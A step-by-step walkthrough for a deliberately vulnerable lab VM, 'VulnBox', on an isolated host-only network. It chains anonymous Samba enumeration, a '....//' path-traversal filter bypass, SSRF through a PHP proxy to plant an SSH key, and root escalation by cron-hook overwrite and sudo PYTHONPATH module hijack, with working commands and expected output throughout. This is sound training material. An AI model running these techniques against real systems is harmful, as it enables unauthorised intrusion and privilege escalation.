# VulnBox End-to-End Walkthrough (`0-knowledge` to `root`)

This guide walks step by step from an unauthenticated host on the isolated VirtualBox `vboxnet0` network (`192.168.56.0/24`) to full `root` access on **VulnBox** (`192.168.56.101`). Each step is tagged with where it runs (`[Host]` vs. `[VM: dev@vulnbox]`) and follows a **command -> explanation -> expected output** flow so you can copy-paste commands individually and verify every layer.

---

## Prerequisites & Target Discovery (`[Host]`)

Make sure your analyst machine is attached to `vboxnet0` (`192.168.56.0/24`) and has `nmap`, `smbclient`, `curl`, and an OpenSSH client installed.

```bash
sudo nmap -sV -p 22,445,5000,8080 192.168.56.101
```

**Why this matters:**
Only ports `22/tcp` (SSH), `445/tcp` (Samba), and `8080/tcp` (Nginx) are allowed through UFW. Port `5000/tcp` shows `filtered` because UFW drops incoming connections to it and Flask binds strictly to `127.0.0.1:5000`. *(You can also run `nmap -sV` without `sudo`. If VirtualBox DHCP assigned a different address in `192.168.56.0/24`, run `nmap -sn 192.168.56.0/24` first and replace `192.168.56.101` below.)*

```text
PORT     STATE    SERVICE     VERSION
22/tcp   open     ssh         OpenSSH 10.2p1 Ubuntu 2ubuntu3.8 (Ubuntu Linux; protocol 2.0)
445/tcp  open     netbios-ssn Samba smbd 4.6.2
5000/tcp filtered upnp
8080/tcp open     http        nginx 1.28.3 (Ubuntu)
```

---

## Stage 1: Samba Anonymous Share Enumeration (`[Host]`, `:445`, `nobody`)

### Step 1.1 (`[Host]`). List available SMB shares

```bash
smbclient -N -L //192.168.56.101/
```

**Explanation:** `-N` skips password authentication. Because `smb.conf` enables `map to guest = Bad User` and configures `[public]` with `guest ok = yes` and `guest only = yes`, Samba maps the anonymous session to `nobody` and exposes the `[public]` share.

```text
        Sharename       Type      Comment
        ---------       ----      -------
        public          Disk      VulnBox Public Deployment Notes
        IPC$            IPC       IPC Service (VulnBox File Server)
SMB1 disabled -- no workgroup available
```

### Step 1.2 (`[Host]`). Download and read `deployment-notes.txt`

```bash
smbclient -N //192.168.56.101/public -c "get deployment-notes.txt -"
```

**Explanation:** Streams `/srv/samba/public/deployment-notes.txt` directly to stdout. This draft file was left behind after deployment and reveals:
- the web portal paths and parameters (`?module=status`, `?log=<filename>`, `?proxy_path=<endpoint>&token=<tok>`),
- the base log directory (`/var/log/webapp/`),
- the loopback Flask API address (`127.0.0.1:5000`), and
- the location of the API token file (`/opt/internal_api/config.ini`).

```text
========================================================================
VulnBox - Internal Deployment Notes (Draft v1.2)
========================================================================
Host:              vulnbox
Service Account:   dev
Web Portal (:8080): /var/www/vulnbox/index.php (?module=status)
Diagnostics View:   /?log=<filename> (logs dir: /var/log/webapp/)
Internal Bridge:    /?proxy_path=<endpoint>&token=<tok>

Internal Services:
- Loopback Flask API binds strictly to 127.0.0.1:5000 (systemd: flask-internal)
- Service configuration and API token stored in:
  /opt/internal_api/config.ini
- Scheduled maintenance scripts located in /opt/admin/

Reminder:
Remove this draft file from /srv/samba/public before production handover.
========================================================================
```

---

## Stage 2: Web Diagnostics & Path Normalization Bypass (`[Host]`, `:8080`, `www-data`)

### Step 2.1 (`[Host]`). Inspect the diagnostics portal status page

```bash
curl -s "http://192.168.56.101:8080/?module=status"
```

**Explanation:** Confirms the Nginx + PHP-FPM service on port `8080` is healthy and prints its built-in query parameters.

```text
=== VulnBox Diagnostics Portal ===
Service: vulnbox-web (Nginx + PHP-FPM)
Status: ONLINE
Base Log Directory: /var/log/webapp/
Internal API Bridge: http://127.0.0.1:5000
Usage:
  ?module=status                     - Display service health summary
  ?log=<filename>                    - View diagnostic log from /var/log/webapp/
  ?proxy_path=<endpoint>&token=<tok> - Query local management API on 127.0.0.1:5000
```

### Step 2.2 (`[Host]`). Read `/opt/internal_api/config.ini` via `?log=`

```bash
curl -s "http://192.168.56.101:8080/?log=....//....//....//opt/internal_api/config.ini"
```

**Explanation:**
- `index.php` calls `str_replace('../', '', $rawLog)` only once and prepends `/var/log/webapp/`.
- Each `....//` collapses into `../` when its inner `../` substring is removed once (`..[../]/` -> `../`).
- Because `/var/log/webapp/` is three directories below `/`, three traversals (`....//....//....//`) resolve to `/opt/internal_api/config.ini`.
- `/opt/internal_api/config.ini` has mode `0640` owned by `root:www-data`, so PHP-FPM (`www-data`) is allowed to read it and prints the static `api_token`.

```ini
[VulnBox Log Viewer] Requested path: /var/log/webapp/../../../opt/internal_api/config.ini

[service]
name = vulnbox-internal-api
bind_host = 127.0.0.1
bind_port = 5000
environment = lab-verification

[security]
# Static token required in X-Internal-Token header for /api/v1/* endpoints
api_token = vb-internal-9f8e7d6c5b4a3f2e1d0c
target_account = dev
authorized_keys_path = /home/dev/.ssh/authorized_keys
```

---

## Stage 3 & Stage 4: Loopback Flask API (`127.0.0.1:5000`) & SSH Access (`dev`)

### Step 3.1 (`[Host]`). Query the loopback API through the PHP proxy bridge

```bash
curl -s "http://192.168.56.101:8080/?proxy_path=/api/v1/info&token=vb-internal-9f8e7d6c5b4a3f2e1d0c"
```

**Explanation:** Even though UFW blocks direct external traffic to `5000/tcp`, `index.php` forwards `?proxy_path=` requests from localhost (`127.0.0.1`) to `http://127.0.0.1:5000` and attaches the `token` parameter as the `X-Internal-Token` HTTP header.

```json
{"authorized_keys_path":"/home/dev/.ssh/authorized_keys","endpoints":["/health","/api/v1/info","/api/v1/ssh-key"],"managed_account":"dev","service":"vulnbox-internal-api"}
```

### Step 3.2 (`[Host]`). Ensure you have an Ed25519 SSH keypair on your analyst host

```bash
[ -f ~/.ssh/id_ed25519 ] || ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519 -N ""
```

**Explanation:** Generates `~/.ssh/id_ed25519` and `~/.ssh/id_ed25519.pub` if you do not already have one, without overwriting existing keys.

### Step 3.3 (`[Host]`). Register your SSH public key via `POST /api/v1/ssh-key`

```bash
curl -s -X POST "http://192.168.56.101:8080/?proxy_path=/api/v1/ssh-key&token=vb-internal-9f8e7d6c5b4a3f2e1d0c" \
    --data-urlencode "ssh_key=$(cat ~/.ssh/id_ed25519.pub)"
```

**Explanation:** `index.php` sees `$_POST['ssh_key']`, converts it into a JSON `POST` (`{"ssh_key": "..."}`) to `http://127.0.0.1:5000/api/v1/ssh-key`, and `flask-internal` (running as `User=dev`) appends your public key to `/home/dev/.ssh/authorized_keys` with mode `0600`.

```json
{"account":"dev","authorized_keys_path":"/home/dev/.ssh/authorized_keys","status":"registered"}
```

### Step 4.1 (`[Host]`). Log in as `dev` via SSH

```bash
ssh -i ~/.ssh/id_ed25519 dev@192.168.56.101
```

**Explanation:** Authenticates as `dev` using the registered key and opens an interactive shell on `vulnbox` (type `yes` if prompted to accept the SSH host fingerprint). Because `dev` has a locked password, key authentication is the only way in; avoid 5 failed SSH attempts within 10 minutes or Fail2Ban will ban your IP for 15 minutes. Keep this `dev@vulnbox:~$` session open for Step 4.2 and Stage 5.

```text
Welcome to Ubuntu 26.04.1 LTS (GNU/Linux 7.0.0-44-generic x86_64)
...
dev@vulnbox:~$
```

### Step 4.2 (`[VM: dev@vulnbox]`). Verify identity and read `/home/dev/user.txt`

```bash
id && cat /home/dev/user.txt
```

**Explanation:** Confirms your UID/GID context (`dev`) and retrieves the first stage flag while staying logged in inside `dev@vulnbox:~$`.

```text
uid=1001(dev) gid=1001(dev) groups=1001(dev)
FLAG{Us3r_Sh3ll!7xK9#mP2@vQ4_d3v%8nR1}
```

---

## Stage 5: Privilege Escalation (`[VM: dev@vulnbox]`, `dev` -> `root`, Two Paths)

Run all Stage 5 steps inside the `dev@vulnbox:~$` SSH session opened in Step 4.1.

### Path A: Writable `cron` Hook Script (`root` execution every 60s)

#### Step 5A.1 (`[VM: dev@vulnbox]`). Inspect the scheduled task and hook permissions

```bash
cat /etc/cron.d/vulnbox-maintenance && cat /opt/admin/backup_check.sh && ls -la /opt/admin/hooks/pre_backup.sh
```

**Explanation:** `/etc/cron.d/vulnbox-maintenance` runs `/opt/admin/backup_check.sh` every minute as `root`, and `backup_check.sh` executes `/opt/admin/hooks/pre_backup.sh` if it is executable (`-x`). Because `pre_backup.sh` has mode `0775` and group `dev`, the `dev` user can modify its contents.

```text
# /etc/cron.d/vulnbox-maintenance
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

* * * * * root /opt/admin/backup_check.sh >/dev/null 2>&1
...
-rwxrwxr-x 1 root dev 106 Nov 23 21:15 /opt/admin/hooks/pre_backup.sh
```

#### Step 5A.2 (`[VM: dev@vulnbox]`). Write a verification payload to `pre_backup.sh`

```bash
cat << 'EOF' > /opt/admin/hooks/pre_backup.sh
#!/usr/bin/env bash
set -euo pipefail
id > /tmp/cron_verify.out
cat /root/root.txt >> /tmp/cron_verify.out
chmod 0600 /tmp/cron_verify.out
chown dev:dev /tmp/cron_verify.out
EOF
```

**Explanation:** Overwrites `pre_backup.sh` **in-place** (preserving its `0775` execute bit so `[ -x "${HOOK_SCRIPT}" ]` remains true). On the next minute tick, `cron` executes it as `root` and writes `/root/root.txt` to `/tmp/cron_verify.out` owned by `dev`.

#### Step 5A.3 (`[VM: dev@vulnbox]`). Wait up to 1 minute and read the root output

```bash
sleep 65 && cat /tmp/cron_verify.out
```

```text
uid=0(root) gid=0(root) groups=0(root)
FLAG{R00t_Pwn3d!9zW6@kL3#bT8_sys%4mX2}
```

---

### Path B: `sudoers.d` `SETENV` + `PYTHONPATH` Module Hijack (Immediate `root`)

#### Step 5B.1 (`[VM: dev@vulnbox]`). Check allowed `sudo` rules and inspect `/opt/admin/maintenance.py`

```bash
sudo -l && ls -la /opt/admin/status_helper.py && cat /opt/admin/maintenance.py
```

**Explanation:** `/etc/sudoers.d/90-dev-admin` combines `Defaults:dev env_keep += "PYTHONPATH"` with `SETENV: NOPASSWD: /usr/bin/python3 /opt/admin/maintenance.py`. In addition, `/opt/admin/maintenance.py` removes its own directory from the front of `sys.path` and appends it to the end so directories passed in `PYTHONPATH` take precedence when importing `status_helper`. *(As an alternative without `PYTHONPATH`, `/opt/admin/status_helper.py` itself is also writable by group `dev` with mode `0664`.)*

```text
User dev may run the following commands on vulnbox:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/admin/maintenance.py
-rw-rw-r-- 1 root dev 344 Nov 23 21:15 /opt/admin/status_helper.py
```

#### Step 5B.2 (`[VM: dev@vulnbox]`). Create a rogue `/tmp/status_helper.py` module

```bash
cat << 'EOF' > /tmp/status_helper.py
import os
from pathlib import Path

def collect_system_summary():
    return {
        "euid": os.geteuid(),
        "root_flag": Path("/root/root.txt").read_text(encoding="utf-8").strip(),
    }
EOF
```

**Explanation:** Implements the `collect_system_summary()` function expected by `maintenance.py`, returning the effective UID (`0`) and `/root/root.txt`.

#### Step 5B.3 (`[VM: dev@vulnbox]`). Execute `maintenance.py` via `sudo` with `PYTHONPATH=/tmp`

```bash
sudo PYTHONPATH=/tmp /usr/bin/python3 /opt/admin/maintenance.py
```

**Explanation:** Python searches `/tmp` before `/opt/admin`, imports `/tmp/status_helper.py` inside the privileged `uid=0(root)` process, and prints the root flag immediately.

```text
[VulnBox Maintenance] System summary: {"euid": 0, "root_flag": "FLAG{R00t_Pwn3d!9zW6@kL3#bT8_sys%4mX2}"}
```

---

## Cleanup Before Re-Exporting (Optional)

If you ran this walkthrough on a master VM before exporting `VulnBox.ova`, restore defaults by running `sudo bash box/scripts/cleanup_vm.sh && sudo poweroff` inside the VM (see [SETUP.md](SETUP.md)).
